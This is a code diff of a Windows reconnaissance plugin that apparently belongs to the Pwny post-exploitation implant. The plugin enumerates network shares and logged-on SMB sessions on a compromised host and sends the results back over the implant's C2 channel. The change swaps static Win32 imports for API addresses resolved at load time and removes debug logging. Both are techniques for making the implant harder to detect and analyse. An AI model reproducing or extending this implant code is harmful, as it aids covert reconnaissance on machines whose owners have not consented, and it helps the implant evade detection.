@@ -1,7 +1,7 @@
 /*
  * MIT License
  *
- * Copyright (c) 2020-2024 EntySec
+ * Copyright (c) 2020-2026 EntySec
  *
  * Permission is hereby granted, free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
@@ -31,32 +31,64 @@
 
 #ifdef __windows__
 
-#include <pwny/tab_dll.h>
+#include <pwny/api.h>
+#include <pwny/tlv_types.h>
+#include <pwny/c2.h>
 
 #include <windows.h>
 #include <lm.h>
-#include <string.h>
-#include <pwny/c2.h>
-#include <pwny/log.h>
 
-/* Local copy of wchar_to_utf8 — the core misc.c is not linked into plugins */
+#define COT_PLUGIN
+#include <pwny/tab_cot.h>
+
+/* ------------------------------------------------------------------ */
+/* Win32 function pointer types — resolved at init via cot_resolve()   */
+/* ------------------------------------------------------------------ */
+
+typedef int            (WINAPI *fn_WideCharToMultiByte)(UINT, DWORD, LPCWCH, int,
+                                                        LPSTR, int, LPCCH, LPBOOL);
+typedef NET_API_STATUS (WINAPI *fn_NetShareEnum)(LMSTR, DWORD, LPBYTE *, DWORD,
+                                                  LPDWORD, LPDWORD, LPDWORD);
+typedef NET_API_STATUS (WINAPI *fn_NetSessionEnum)(LMSTR, LMSTR, LMSTR, DWORD,
+                                                    LPBYTE *, DWORD, LPDWORD,
+                                                    LPDWORD, LPDWORD);
+typedef NET_API_STATUS (WINAPI *fn_NetApiBufferFree)(LPVOID);
+
+static struct
+{
+    fn_WideCharToMultiByte  pWideCharToMultiByte;
+    fn_NetShareEnum         pNetShareEnum;
+    fn_NetSessionEnum       pNetSessionEnum;
+    fn_NetApiBufferFree     pNetApiBufferFree;
+} w;
+
+/* ------------------------------------------------------------------ */
+/* Helpers                                                             */
+/* ------------------------------------------------------------------ */
+
 static char *wchar_to_utf8(const wchar_t *in)
 {
     char *out;
     int len;
 
     if (in == NULL)
+    {
         return NULL;
+    }
 
-    len = WideCharToMultiByte(CP_UTF8, 0, in, -1, NULL, 0, NULL, NULL);
+    len = w.pWideCharToMultiByte(CP_UTF8, 0, in, -1, NULL, 0, NULL, NULL);
     if (len <= 0)
+    {
         return NULL;
+    }
 
     out = calloc(len, sizeof(char));
     if (out == NULL)
+    {
         return NULL;
+    }
 
-    if (WideCharToMultiByte(CP_UTF8, 0, in, -1, out, len, NULL, FALSE) == 0)
+    if (w.pWideCharToMultiByte(CP_UTF8, 0, in, -1, out, len, NULL, FALSE) == 0)
     {
         free(out);
         out = NULL;
@@ -65,29 +97,28 @@ static char *wchar_to_utf8(const wchar_t *in)
     return out;
 }
 
-#define NETSHARE_BASE 24
 
 #define NETSHARE_ENUM \
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
-                       NETSHARE_BASE, \
+                       TAB_BASE, \
                        API_CALL)
 
 #define NETSESSION_ENUM \
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
-                       NETSHARE_BASE, \
+                       TAB_BASE, \
                        API_CALL + 1)
 
-#define TLV_TYPE_SHARE_NAME    TLV_TYPE_CUSTOM(TLV_TYPE_STRING, NETSHARE_BASE, API_TYPE)
-#define TLV_TYPE_SHARE_PATH    TLV_TYPE_CUSTOM(TLV_TYPE_STRING, NETSHARE_BASE, API_TYPE + 1)
-#define TLV_TYPE_SHARE_REMARK  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, NETSHARE_BASE, API_TYPE + 2)
-#define TLV_TYPE_SHARE_TYPE    TLV_TYPE_CUSTOM(TLV_TYPE_INT, NETSHARE_BASE, API_TYPE)
-#define TLV_TYPE_SHARE_GROUP   TLV_TYPE_CUSTOM(TLV_TYPE_GROUP, NETSHARE_BASE, API_TYPE)
+#define TLV_TYPE_SHARE_NAME    TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
+#define TLV_TYPE_SHARE_PATH    TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 1)
+#define TLV_TYPE_SHARE_REMARK  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 2)
+#define TLV_TYPE_SHARE_TYPE    TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE)
+#define TLV_TYPE_SHARE_GROUP   TLV_TYPE_CUSTOM(TLV_TYPE_GROUP, TAB_BASE, API_TYPE)
 
-#define TLV_TYPE_SESSION_CLIENT TLV_TYPE_CUSTOM(TLV_TYPE_STRING, NETSHARE_BASE, API_TYPE + 3)
-#define TLV_TYPE_SESSION_USER   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, NETSHARE_BASE, API_TYPE + 4)
-#define TLV_TYPE_SESSION_TIME   TLV_TYPE_CUSTOM(TLV_TYPE_INT, NETSHARE_BASE, API_TYPE + 1)
-#define TLV_TYPE_SESSION_IDLE   TLV_TYPE_CUSTOM(TLV_TYPE_INT, NETSHARE_BASE, API_TYPE + 2)
-#define TLV_TYPE_SESSION_GROUP  TLV_TYPE_CUSTOM(TLV_TYPE_GROUP, NETSHARE_BASE, API_TYPE + 1)
+#define TLV_TYPE_SESSION_CLIENT TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 3)
+#define TLV_TYPE_SESSION_USER   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 4)
+#define TLV_TYPE_SESSION_TIME   TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE + 1)
+#define TLV_TYPE_SESSION_IDLE   TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE + 2)
+#define TLV_TYPE_SESSION_GROUP  TLV_TYPE_CUSTOM(TLV_TYPE_GROUP, TAB_BASE, API_TYPE + 1)
 
 static const char *share_type_name(DWORD type)
 {
@@ -112,17 +143,16 @@ static tlv_pkt_t *netshare_enum(c2_t *c2)
     DWORD i;
     tlv_pkt_t *result;
 
-    status = NetShareEnum(NULL, 2, (LPBYTE *)&pBuf,
-                          MAX_PREFERRED_LENGTH,
-                          &entriesRead, &totalEntries,
-                          &resumeHandle);
+    status = w.pNetShareEnum(NULL, 2, (LPBYTE *)&pBuf,
+                             MAX_PREFERRED_LENGTH,
+                             &entriesRead, &totalEntries,
+                             &resumeHandle);
 
     if (status != NERR_Success && status != ERROR_MORE_DATA)
     {
-        log_debug("* netshare_enum: NetShareEnum failed (%lu)\n", status);
         if (pBuf != NULL)
         {
-            NetApiBufferFree(pBuf);
+            w.pNetApiBufferFree(pBuf);
         }
         return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
     }
@@ -169,7 +199,7 @@ static tlv_pkt_t *netshare_enum(c2_t *c2)
 
     if (pBuf != NULL)
     {
-        NetApiBufferFree(pBuf);
+        w.pNetApiBufferFree(pBuf);
     }
 
     return result;
@@ -186,18 +216,17 @@ static tlv_pkt_t *netsession_enum(c2_t *c2)
     DWORD i;
     tlv_pkt_t *result;
 
-    status = NetSessionEnum(NULL, NULL, NULL, 10,
-                            (LPBYTE *)&pBuf,
-                            MAX_PREFERRED_LENGTH,
-                            &entriesRead, &totalEntries,
-                            &resumeHandle);
+    status = w.pNetSessionEnum(NULL, NULL, NULL, 10,
+                               (LPBYTE *)&pBuf,
+                               MAX_PREFERRED_LENGTH,
+                               &entriesRead, &totalEntries,
+                               &resumeHandle);
 
     if (status != NERR_Success && status != ERROR_MORE_DATA)
     {
-        log_debug("* netsession_enum: NetSessionEnum failed (%lu)\n", status);
         if (pBuf != NULL)
         {
-            NetApiBufferFree(pBuf);
+            w.pNetApiBufferFree(pBuf);
         }
         return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
     }
@@ -238,14 +267,29 @@ static tlv_pkt_t *netsession_enum(c2_t *c2)
 
     if (pBuf != NULL)
     {
-        NetApiBufferFree(pBuf);
+        w.pNetApiBufferFree(pBuf);
     }
 
     return result;
 }
 
-TAB_DLL_EXPORT void TabInit(api_calls_t **api_calls)
+/* ------------------------------------------------------------------ */
+/* COT entry                                                           */
+/* ------------------------------------------------------------------ */
+
+COT_ENTRY
 {
+    /* Resolve Win32 APIs once at load time */
+    w.pWideCharToMultiByte = (fn_WideCharToMultiByte)cot_resolve("kernel32.dll",
+                                                                 "WideCharToMultiByte");
+    w.pNetShareEnum        = (fn_NetShareEnum)cot_resolve("netapi32.dll",
+                                                           "NetShareEnum");
+    w.pNetSessionEnum      = (fn_NetSessionEnum)cot_resolve("netapi32.dll",
+                                                              "NetSessionEnum");
+    w.pNetApiBufferFree    = (fn_NetApiBufferFree)cot_resolve("netapi32.dll",
+                                                               "NetApiBufferFree");
+
+    /* Register handlers */
     api_call_register(api_calls, NETSHARE_ENUM, (api_t)netshare_enum);
     api_call_register(api_calls, NETSESSION_ENUM, (api_t)netsession_enum);
 }
